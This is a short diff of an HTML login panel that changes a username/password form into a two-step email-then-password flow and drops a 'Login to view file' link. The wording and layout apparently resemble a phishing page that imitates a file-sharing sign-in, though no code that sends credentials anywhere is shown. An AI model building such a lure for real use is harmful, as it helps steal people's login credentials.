@@ -110,10 +110,14 @@
     <!-- Drop-down Login Panel -->
     <div id="login" class="login-container">
         <h2>Login to Your Account</h2>
-        <input type="text" id="username" placeholder="Username" required>
-        <input type="password" id="password" placeholder="Password" required>
-        <button onclick="authenticate()">Login</button>
-        <p><a href="#" class="forgot-password">Login to view file</a></p>
+        <div id="emailSection">
+            <input type="email" id="email" placeholder="Email Address" required>
+            <button onclick="showPasswordField()">Next</button>
+        </div>
+        <div id="passwordSection" style="display: none;">
+            <input type="password" id="password" placeholder="Password" required>
+            <button onclick="authenticate()">Login</button>
+        </div>
     </div>
 
     <!-- Confirmation Message -->
